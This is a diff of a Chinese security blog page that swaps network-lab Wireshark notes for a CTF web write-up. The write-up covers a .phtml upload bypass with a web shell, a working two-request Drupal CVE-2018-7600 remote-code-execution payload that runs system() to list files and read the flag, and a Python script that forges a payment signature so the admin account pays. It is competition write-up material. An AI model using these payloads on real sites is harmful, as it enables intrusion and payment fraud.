@@ -15,50 +15,43 @@
 
 
 
-<meta name="description" content="前言总算有时间把计网实验的学习过程记录一下了。也当做是一个复习的过程，过程太长，分两篇博客写吧。">
-<meta name="keywords" content="计算机网路">
+<meta name="description" content="ez-upload这个题目作为Web题的第一个题难度刚好，很基础的漏洞点，就考了个文件上传，上来直接用phtml就可以绕过，但是给出来的hint是.htaccess,可能是我非预期了？  菜刀链接获取flag  Cve参考了这篇文章：https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#代码执行现场 这是一个Drupal 7的cve，照">
+<meta name="keywords" content="CTF,Web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="计网实验笔记(一)">
-<meta property="og:url" content="0verwatch.top/2018/07/20/comp-net-1/index.html">
+<meta property="og:title" content="CUMT双月赛Web题解">
+<meta property="og:url" content="0verwatch.top/2018/12/16/CUMT-month-race/index.html">
 <meta property="og:site_name" content="0verWatch&#39;s Blog">
-<meta property="og:description" content="前言总算有时间把计网实验的学习过程记录一下了。也当做是一个复习的过程，过程太长，分两篇博客写吧。">
+<meta property="og:description" content="ez-upload这个题目作为Web题的第一个题难度刚好，很基础的漏洞点，就考了个文件上传，上来直接用phtml就可以绕过，但是给出来的hint是.htaccess,可能是我非预期了？  菜刀链接获取flag  Cve参考了这篇文章：https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#代码执行现场 这是一个Drupal 7的cve，照">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/19/P3dftU.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/19/P30lMd.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/19/P30YIf.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P32ksU.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3RwN9.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3Rlhn.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3R0hR.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3RqHg.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3W85d.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3hE11.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3hZX6.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3hmnK.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3htnf.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3hwNQ.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3hD9s.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3hscq.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3hcuV.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3h2HU.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3hh4J.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3h5C9.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3hog1.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3hHu6.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3hbDK.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P34ZCj.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P34m2n.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P34nvq.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P35j1A.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P35v6I.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3Ip0f.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3I978.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/07/20/P3Iitg.md.png">
-<meta property="og:updated_time" content="2018-07-20T06:18:51.115Z">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/Fa0BnI.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/Fa0rHP.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FayX0s.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/Fa6knJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/Fa66Nq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FaNVu6.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FaNeHO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FaNuUe.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FaN1gI.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FaN3vt.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FaNoKx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FaNjGd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FaBebt.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FadGK1.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FawmQA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd2lLD.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd2aSP.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdRPfI.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdRe0g.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdWnKK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdWfZF.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdfaS1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdhFpR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd5Lpd.png">
+<meta property="og:updated_time" content="2018-12-16T12:06:24.165Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="计网实验笔记(一)">
-<meta name="twitter:description" content="前言总算有时间把计网实验的学习过程记录一下了。也当做是一个复习的过程，过程太长，分两篇博客写吧。">
-<meta name="twitter:image" content="https://s1.ax1x.com/2018/07/19/P3dftU.md.png">
+<meta name="twitter:title" content="CUMT双月赛Web题解">
+<meta name="twitter:description" content="ez-upload这个题目作为Web题的第一个题难度刚好，很基础的漏洞点，就考了个文件上传，上来直接用phtml就可以绕过，但是给出来的hint是.htaccess,可能是我非预期了？  菜刀链接获取flag  Cve参考了这篇文章：https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#代码执行现场 这是一个Drupal 7的cve，照">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/12/15/Fa0BnI.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -90,7 +83,7 @@
 <link href="//lib.baomitu.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>计网实验笔记(一) | 0verWatch&#39;s Blog</title>
+<title>CUMT双月赛Web题解 | 0verWatch&#39;s Blog</title>
 
 <script src="//lib.baomitu.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//lib.baomitu.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -328,11 +321,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-comp-net-1" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-CUMT-month-race" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/07/20/comp-net-1/" class="article-date">
-      <time datetime="2018-07-20T06:05:22.000Z" itemprop="datePublished">2018-07-20</time>
+      <a href="/2018/12/16/CUMT-month-race/" class="article-date">
+      <time datetime="2018-12-16T12:05:32.000Z" itemprop="datePublished">2018-12-16</time>
 </a>
 
 
@@ -347,7 +340,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      计网实验笔记(一)
+      CUMT双月赛Web题解
     </h1>
   
 
@@ -356,13 +349,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/计算机网路/">计算机网路</a>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/计算机网路/">计算机网路</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -373,38 +366,74 @@
       
           
         
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总算有时间把计网实验的学习过程记录一下了。也当做是一个复习的过程，过程太长，分两篇博客写吧。<br><a id="more"></a></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这一篇是对协议报文的分析，这里面有对Wireshark的使用，只能说我对于Wireshark这款软件的使用还是渣。各种ip地址的过滤以及如何去利用Wireshark强大的搜索功能这里就不多说了。个人感觉最好的方法就是在CTF里面的流量分析题目里学，在CTF的流量分析题目里面你会经常触碰到那种要导出文件图片，导进秘钥解密https的各种类型题，感觉学的会更快。</p>
-<p>不多说废话下面上课实验的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1） 运用抓包工具，分别获取不同互联网访问情形下的本机网卡数据包；过滤捕获和过滤显示不同条件的数据包。</span><br><span class="line">（2）分别对不同互联网访问情形下的数据包进行逐层分析，给出各层协议的主要参数及意义；要求分别获取WWW服务、Email服务、QQ通信和迅雷文件下载四种不同网络服务过程中的数据包。</span><br><span class="line">（3）运用抓包工具，连续获取面向连接的互联网访问情形下的本机网卡数据包；对连续获取的数据包找到执行面向连接过程的报文，给出实现面向连接过程（TCP三次握手）的详细分析。</span><br></pre></td></tr></table></figure></p>
-<h3 id="实验内容第一点"><a href="#实验内容第一点" class="headerlink" title="实验内容第一点"></a>实验内容第一点</h3><p><strong>http协议</strong><br>关于这个协议，个人理解是万维网的服务协议，默认端口是80端口，运输层使用的是可靠的TCP，不过现在也有它的加密版本https，也就是在http的基础上增加了ssl去加密，默认端口是443，所以在我们需要解密含有https的报文的时候，想查看更多的信息，应该追踪http流而不应该追踪tcp，到运输层的时候已经加密了，看不出啥东西的，我记得DDCTF里面有一道流量分析的题目就是这样的，里面可以导出一个图片然后运用的是ocr把秘钥提取出来。确实有点烦，ocr这东西不准。对于Wireshark里面的分组，我们可以直接过滤http就可以获得啦，前提是记得访问http的页面，别访问https的页面，233333，不然你只能顾虑的是https了。</p>
-<p><a href="https://imgchr.com/i/P3dftU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P3dftU.md.png" alt="P3dftU.md.png"></a></p>
-<p><strong>UDP协议</strong><br>UDP协议是面向报文的一种协议，如果你观察他的封装，你会发现客户给他什么数据他就直接封装网下层IP层送去，不像TCP一样会有时候会对报文的进行分组处理，所以一般UDP都是不可靠，无连接的，除非上层的应用程序承担了检错的任务，所以UDP协议追求的是效率，一般都用在视频语音上了。我们在抓包的时候直接使用udp就可以过滤网络中的udp用户数据报文了。</p>
-<p><a href="https://imgchr.com/i/P30lMd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P30lMd.md.png" alt="P30lMd.md.png"></a></p>
-<p><strong>TCP协议</strong><br>TCP协议是是一种面向字节流，可靠，面向连接的协议，他对于用户传送的报文可以进行分组形成报文段，其中协议中如何保证传输的正确性，如何进行拥塞控制，如何进行连接的建立以及释放都是重点，为了复习，还是回顾一下吧，其中保证传输的正确性窗口(窗口的概念就不多讲了)的作用至关重要，其中最为重要的是其中的ARQ协议(自动重传协议)，对于拥塞控制，最重要的还是那四个算法，慢开始，拥塞避免，快重传，快恢复，关键点就在拥塞窗口值以及门限值的变化并且在不同情况下使用的算法也不一样，慢开始是使用在一开始的时候以及发现超时的时候使用的，而快重传，快恢复是在在超时计数器结束前连续收到三个响应报文使用的。在过滤的时候我们只需要用tcp命令就可把TCP报文给滤出来了。</p>
-<p><a href="https://imgchr.com/i/P30YIf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/19/P30YIf.md.png" alt="P30YIf.md.png"></a></p>
-<p><strong>ICMP协议</strong><br>ICMP协议是一种用于报告错误信息的协议，位于IP层，我们平常使用的ping，tracert命令都是属于这一协议里面的，这两个命令都十分常用，ping用于及钠盐网络是否连通，而是用tracert命令我们可以探测出网络拓扑结构，所以要抓到icmp的报文，只需要ping一下然后在Wireshark里面用icmp这一个命令过滤出来即可。<br><a href="https://imgchr.com/i/P32ksU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P32ksU.md.png" alt="P32ksU.md.png"></a></p>
-<h3 id="实验内容第二点"><a href="#实验内容第二点" class="headerlink" title="实验内容第二点"></a>实验内容第二点</h3><p>先把各部分的包的先过滤出来</p>
-<p><strong>WWW服务数据包:</strong><br><a href="https://imgchr.com/i/P3RwN9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3RwN9.md.png" alt="P3RwN9.md.png"></a><br><strong>Email服务数据包:</strong><br><a href="https://imgchr.com/i/P3Rlhn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Rlhn.md.png" alt="P3Rlhn.md.png"></a><br><strong>QQ通信数据包:</strong><br><a href="https://imgchr.com/i/P3R0hR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3R0hR.md.png" alt="P3R0hR.md.png"></a></p>
-<p><strong>迅雷文件下载服务数据包:</strong><br><a href="https://imgchr.com/i/P3RqHg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3RqHg.md.png" alt="P3RqHg.md.png"></a></p>
-<p>不同互联网访问情形下的数据包进行逐层分析，先Packet Details Pane(封包详细信息)有大致理解, 显示封包中的字段，各行信息说明如下：</p>
-<ol>
-<li>Frame:  物理层的数据帧概况(这是最底层的，一般以比特流传送，看不懂)</li>
-<li>Ethernet II:  数据链路层以太网帧头部信息，</li>
-<li>Internet Protocol Version 4:  互联网层IP包头部信息</li>
-<li>Transmission Control Protocol:  传输层T的数据段头部信</li>
-<li>Hypertext Transfer Protocol:  应用层的信息</li>
-</ol>
-<p><strong>UDP数据包详细分析：</strong><br><a href="https://imgchr.com/i/P3W85d" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3W85d.md.png" alt="P3W85d.md.png"></a><br>这个数据包的详细信息里面包含了物理层(Frame那一行)，数据链路层(Ethernet那一行)，网路层(Internet Protocol那一行)，传输层(User Datagram Protocol那一行)还有应用层数据，层次结构十分明显。<br>从UDP的报文格式可以得到UDP的首部信息，源端口为4026，目的端口为8000，UDP长度为55，检验和为0x4362<br><a href="https://imgchr.com/i/P3hE11" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hE11.md.png" alt="P3hE11.md.png"></a><br>再看IP层的内容<br><a href="https://imgchr.com/i/P3hZX6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hZX6.md.png" alt="P3hZX6.md.png"></a><br>可以清楚分析出他的首部信息，首部长为20字节，还有标识位5428，3位没有设置的标志位以及总长度偏移量，TTL为64，协议字段17，代表了上层使用UDP，下面就是源IP为192.168.1.101，目的IP为140.207.62.105<br>再往下分析就是数据链路层了，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hmnK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hmnK.md.png" alt="P3hmnK.md.png"></a></p>
-<p><strong>http数据包详细分析：</strong><br><a href="https://imgchr.com/i/P3htnf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3htnf.md.png" alt="P3htnf.md.png"></a><br>对于http数据进行分析，发现还是离不开五层协议，物理层，数据链路层，网路层，传输层，还有应用层，层次结构十分明显，这一次应用层以http报文显示，里面传递的的东西很明确，通过GET方式访问网站资源，访问的主机名为pub.idqqimg.com,还有其他的一些浏览器相关的信息等等。<br><a href="https://imgchr.com/i/P3hwNQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hwNQ.md.png" alt="P3hwNQ.md.png"></a><br> 下面一层是TCP，可以看出TCP首部信息，我们也可以从另一个方面推出http协议使用的运输层协议是tcp，源端口为18122，目的端口为80，还有它的序号以及确认信号，还可以看到标志位Flags，窗口大小为32768，首部长度为20，检验和是0x0dfc,紧急指针Urgent pointer置0<br> <a href="https://imgchr.com/i/P3hD9s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hD9s.md.png" alt="P3hD9s.md.png"></a><br>再看IP层的内容，可以清楚分析出他的首部信息，版本号为4，首部长为20字节，还有标识633，3位没有设置的标志位Flags以及总长度偏移量，TTL为64，协议字段6，代表了上层使用TCP，下面就是源IP为192.168.1.101，目的IP为157.0.149.41<br><a href="https://imgchr.com/i/P3hscq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hscq.md.png" alt="P3hscq.md.png"></a><br>分析数据链路层，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hcuV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hcuV.md.png" alt="P3hcuV.md.png"></a></p>
-<p><strong>TCP包详细分析：</strong><br><a href="https://imgchr.com/i/P3h2HU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3h2HU.md.png" alt="P3h2HU.md.png"></a><br>分析TCP同样可以看出TCP首部信息，源端口为18122，目的端口为80，还有它的序号以及确认<br>信号，还可以看到标志位Flags，窗口大小为65535，首部长度为20，检验和是0x16eb,紧急指针Urgent pointer置0<br>IP层的内容，可以清楚分析出他的首部信息，版本号为4，首部长为20字节，还有标识631，3位没有设置的标志位Flags以及总长度偏移量，TTL为64，协议字段6，代表了上层使用TCP，下面就是源IP为192.168.1.101，目的IP为157.0.149.41<br><a href="https://imgchr.com/i/P3hh4J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hh4J.md.png" alt="P3hh4J.md.png"></a></p>
-<p>数据链路层，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3h5C9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3h5C9.md.png" alt="P3h5C9.md.png"></a></p>
-<p><strong>ICMP包详细分析：</strong><br>使用icmp过滤相关的报文，分析根据报文格式分析icmp包里面的内容，Type显示8表明这是一个请求报文<br><img src="https://s1.ax1x.com/2018/07/20/P3hog1.png" alt="P3hog1.png"><br>分析网络层和数据链路层跟前面几次没什么区别，源IP为192.168.1.101，目的IP为192.168.1.100，IP首部为20字节，IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hHu6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hHu6.md.png" alt="P3hHu6.md.png"></a><br><a href="https://imgchr.com/i/P3hbDK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hbDK.md.png" alt="P3hbDK.md.png"></a></p>
-<p><strong>分析QQ的报文：</strong><br><a href="https://imgchr.com/i/P34ZCj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34ZCj.md.png" alt="P34ZCj.md.png"></a><br>对于QQ的包可以得出来应用层是使用了OICQ的协议，里面包含了QQ号的信息以及加密过了的数据，使用的是UDP的传输协议，源端口是8000，目的端口是4026<br>对于网络层以及数据链路层是一样的分析过程，源IP是140.207.62.150，目的IP是192.168.1.101，传输层使用的是UDP，TTL是55<br><a href="https://imgchr.com/i/P34m2n" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34m2n.md.png" alt="P34m2n.md.png"></a></p>
-<p><strong>对邮件包分析：</strong><br><a href="https://imgchr.com/i/P34nvq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34nvq.md.png" alt="P34nvq.md.png"></a><br>可以看得出来邮件传送有一个建立连接的过程，从哪里发的并且在哪里接收都有对应的邮箱，建立连接的密码用base64加密过了，看下层运输层是使用TCP建立连接的，目的端口是17379，源端口号25，窗口值138，序号是454，IP版本是IPv4，源IP是192.168.1.101，  目的IP是123.125.50.138</p>
-<h3 id="实验内容第三点"><a href="#实验内容第三点" class="headerlink" title="实验内容第三点"></a>实验内容第三点</h3><p>访问网站<code>www.souci.li</code>,过滤http然后追踪tcp流就可以看见http协议工作的大概过程(在这之前应该还得通过DNS去解析域名，你会发现这个包过滤DNS会发现把域名转换成IP的过程)，然后就是封装http请求数据包，封装成tcp包，建立tcp连接（三报文握手在HTTP工作开始 之前，客户机（Web浏览器）首先要通过网络与服务器建立连接，该连接是通过TCP来完成的，客户端发送请求，服务器响应，服务器关闭tcp连接<br><a href="https://imgchr.com/i/P35j1A" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P35j1A.md.png" alt="P35j1A.md.png"></a><br><a href="https://imgchr.com/i/P35v6I" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P35v6I.md.png" alt="P35v6I.md.png"></a><br>分析三报文握手的过程：<br><strong>第一次报文握手</strong><br><a href="https://imgchr.com/i/P3Ip0f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Ip0f.md.png" alt="P3Ip0f.md.png"></a><br>客户端发送一个TCP，标志位为SYN，序列号为0， 代表客户端请求建立连接</p>
-<p><strong>第二次握手的数据包</strong><br>服务器发回确认包, 标志位为 SYN,ACK. 将确认序号(Acknowledgement Number)设置为客户的I S N加1,即0+1=1, 如下图<br><a href="https://imgchr.com/i/P3I978" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3I978.md.png" alt="P3I978.md.png"></a></p>
-<p><strong>第三次握手的数据包</strong><br>客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK 的序号字段+1,放在确定字段中发送给对方,如下图:<br><a href="https://imgchr.com/i/P3Iitg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Iitg.md.png" alt="P3Iitg.md.png"></a><br>就这样通过了TCP三报文握手，建立了连接</p>
-<p>小小回顾，感觉废话太多，emmm。。。</p>
+<h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h3><p>这个题目作为Web题的第一个题难度刚好，很基础的漏洞点，就考了个文件上传，上来直接用phtml就可以绕过，但是给出来的hint是.htaccess,可能是我非预期了？</p>
+<p><a href="https://imgchr.com/i/Fa0BnI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa0BnI.png" alt="Fa0BnI.png"></a></p>
+<p>菜刀链接获取flag</p>
+<p><a href="https://imgchr.com/i/Fa0rHP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa0rHP.png" alt="Fa0rHP.png"></a></p>
+<h3 id="Cve"><a href="#Cve" class="headerlink" title="Cve"></a>Cve</h3><p>参考了这篇文章：<code>https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#代码执行现场</code></p>
+<p>这是一个Drupal 7的cve，照着构造payload就好，payload 分为两个请求。 先将 Payload 注入缓存中，构造下面的payload，发送一个POST包</p>
+<p>POST请求：<code>/?q=user/password&amp;name[%23post_render][]=system&amp;name[%23type]=markup&amp;name[%23markup]=ls%20/</code></p>
+<p>POST内容：<code>form_id=user_pass&amp;_triggering_element_name=name</code></p>
+<p>获取form_build_id的value值：</p>
+<p><a href="https://imgchr.com/i/FayX0s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FayX0s.png" alt="FayX0s.png"></a></p>
+<p>然后再POST发送执行的包：<code>/?q=file/ajax/name/%23value/form-b7pP9HUKwcQBEuhZ1GZ79qWXV0KRb5YxUGoWaozSPRU</code>这里也需要form_build_id的值，POST的内容也是：<code>form_build_id=form-b7pP9HUKwcQBEuhZ1GZ79qWXV0KRb5YxUGoWaozSPRU</code>成功执行命令，这里注意一下参考文章里面的<code>passthru</code>命令用不了，只能改为<code>system</code>才能执行相关命令,所以上面缓存的时候换了用<code>system</code>函数</p>
+<p><a href="https://imgchr.com/i/Fa6knJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa6knJ.png" alt="Fa6knJ.png"></a></p>
+<p>再来一次<code>cat /flag</code>的操作就可以读取flag了</p>
+<p><a href="https://imgchr.com/i/Fa66Nq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa66Nq.png" alt="Fa66Nq.png"></a></p>
+<h3 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h3><p>这个题是个代码审计的题目，先把源码给down下来</p>
+<p>打开这个网站发现有登陆注册功能，以及购买flag的功能，但是这里面要想得到真正的flag却需要888积分才可以购买，这个时候就感觉应该是越权购买flag的漏洞了。。。。</p>
+<p>发现源码里面有数据库文件打开看一下，发现是存在管理员的，并且id是16，这个东西后期有用，而且他有30000积分，够买很多flag了，还有商品id 38也可以得知</p>
+<p><a href="https://imgchr.com/i/FaNVu6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNVu6.md.png" alt="FaNVu6.md.png"></a></p>
+<p><a href="https://imgchr.com/i/FaNeHO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNeHO.png" alt="FaNeHO.png"></a></p>
+<p>看到代码里面的setting文件，有从secret.key读出来的秘钥</p>
+<p><a href="https://imgchr.com/i/FaNuUe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNuUe.md.png" alt="FaNuUe.md.png"></a></p>
+<p>看一下里面的秘钥，一定要注意这里还有个回车啊啊啊啊，后边伪造签名有用</p>
+<p><a href="https://imgchr.com/i/FaN1gI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaN1gI.png" alt="FaN1gI.png"></a></p>
+<p>重点关注这段代码</p>
+<p><a href="https://imgchr.com/i/FaN3vt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaN3vt.md.png" alt="FaN3vt.md.png"></a></p>
+<p>这里可以看出单单对商品方做了校验(自检验)，那购买者呢？不存在对其的任何校验，也就是没有做好双向的校验，这也说明我们可以从伪造购买者的方面去入手，让别人付钱23333</p>
+<p>根据它里面的代码去构造signature就好了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = <span class="string">'zhinianyuxin\n'</span></span><br><span class="line">form = &#123;</span><br><span class="line">		<span class="string">'order_id'</span>: <span class="string">'119'</span>,</span><br><span class="line">		<span class="string">'buyer_id'</span>: <span class="string">'16'</span>,  </span><br><span class="line">		<span class="string">'good_id'</span>: <span class="string">'38'</span>,   </span><br><span class="line">		<span class="string">'buyer_point'</span>: <span class="string">'200'</span>,</span><br><span class="line">		<span class="string">'good_price'</span>: <span class="string">'50'</span>,</span><br><span class="line">		<span class="string">'order_create_time'</span>: <span class="string">'1544796662.686132'</span></span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form])</span><br><span class="line">str2sign3= str2sign.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">sign = md5(str2sign3).hexdigest()</span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure>
+<p>发包构造一下得到flag,注意红色的地方也要做相应的修改，发包得到flag</p>
+<p><a href="https://imgchr.com/i/FaNoKx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNoKx.png" alt="FaNoKx.png"></a></p>
+<p><a href="https://imgchr.com/i/FaNjGd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNjGd.png" alt="FaNjGd.png"></a></p>
